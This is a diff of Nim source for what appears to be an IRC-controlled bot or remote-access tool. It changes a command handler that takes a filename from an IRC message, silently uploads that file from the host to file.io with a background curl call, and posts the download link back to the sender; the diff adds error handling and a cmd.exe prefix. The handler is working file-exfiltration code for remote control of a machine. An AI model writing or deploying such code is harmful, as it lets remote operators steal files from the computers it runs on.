@@ -102,15 +102,18 @@ proc cmd_getFileIO(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
     var filename = helper_recombine(tokens,1)
 
     if fileExists(filename):
-        var (output, _ ) = execCmdEx("start /B curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+        try:
+            var (output, _ ) = execCmdEx("cmd.exe start /B curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
 
-        if output.contains("success\":true"):
-            try:
-                var json_data = parseJson(output)
-                var download_link = json_data["link"].str
-                client.privmsg(event.origin, "you have 1 hour: " & download_link)
-            except:
-                client.privmsg(event.origin, "parsing error, you have 1 hour: " & output)
+            if output.contains("success\":true"):
+                try:
+                    var json_data = parseJson(output)
+                    var download_link = json_data["link"].str
+                    client.privmsg(event.origin, "you have 1 hour: " & download_link)
+                except:
+                    client.privmsg(event.origin, "parsing error, you have 1 hour: " & output)
+        except:
+            client.privmsg(event.origin, "you just crashed the whole thing with that")
     else:
         if g_dbg: echo "File missing"
         client.privmsg(event.origin, "i dont see it")
